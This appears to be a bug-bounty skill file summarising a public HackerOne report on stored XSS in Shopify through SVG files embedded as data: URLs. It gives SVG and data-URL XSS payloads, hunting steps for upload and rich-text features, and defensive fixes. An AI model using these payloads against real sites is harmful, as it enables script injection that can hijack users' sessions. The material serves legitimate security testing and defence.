---
name: xss-svg-data-url
description: Stored XSS via SVG file embedded as a data: URL — the SVG/XML sink that survives many HTML sanitizers. Teaches SVG, data-URL, and namespace-based XSS bypasses for file-upload and rich-text features.
sources: hackerone_public
report_count: 1
---

# Stored XSS via SVG as data: URL

**Report**: Shopify — "Stored XSS in SVG file as data: url" (hackerone.com/reports/1276742, medium, $5,300, Stored XSS).

## Why it matters (the new lesson)
HTML sanitizers (DOMPurify, Bleach, custom allowlists) often *allow* `<img src="data:image/svg+xml,...">` or accept uploaded SVGs, but SVG is a full XML document that executes JS via `<script>`, `<foreignObject>`, or event handlers. Uploading/embedding an SVG is one of the most reliable ways to get **stored** XSS past a filter that otherwise blocks `<script>`.

## How it works
```html
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoZG9jdW1lbnQuZG9tYWluKSI+PC9zdmc+">
```
Or an uploaded `.svg` served inline:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject>
</svg>
```

## How to hunt for it
1. Find file-upload / avatar / image-embed features that accept `image/svg+xml`.
2. Upload an SVG with `<script>`, `onload`, `<foreignObject>`, or `<animate onbegin>`.
3. Open the served file directly (not via `<img>`) and confirm execution.
4. Also test `<img src="data:image/svg+xml;utf8,<svg onload=...>">` in rich-text/comment fields.

## Payloads
```
<svg/onload=alert(document.domain)>
<svg><script>alert(1)</script></svg>
<svg xmlns="..."><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>
data:image/svg+xml;base64,<base64 of the above>
```

## Fix
Serve uploads from a sandboxed/isolated domain with `Content-Disposition: attachment` + `Content-Security-Policy`; rasterize or reject SVG; block `data:` in img src; sanitize with SVG-aware libs.
